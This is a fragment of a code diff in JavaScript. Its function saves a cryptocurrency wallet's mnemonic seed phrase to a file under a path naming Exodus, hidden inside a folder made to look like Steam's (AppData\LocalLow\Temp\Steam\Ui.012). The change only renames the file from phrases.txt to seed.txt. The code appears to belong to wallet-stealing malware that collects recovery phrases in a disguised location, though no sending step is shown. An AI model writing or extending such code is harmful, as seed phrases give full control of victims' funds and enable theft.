@@ -86,7 +86,7 @@ function readPasswordFromFile() {
 function saveMnemonicToFile(mnemonic) {
   try {
     const username = require("os").userInfo().username;
-    const phrasesPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Wallet\\Exodus\\phrases.txt`;
+    const phrasesPath = `C:\\Users\\${username}\\AppData\\LocalLow\\Temp\\Steam\\Ui.012\\Wallet\\Exodus\\seed.txt`;
 
     const dirPath = path.dirname(phrasesPath);
     if (!fs.existsSync(dirPath)) {
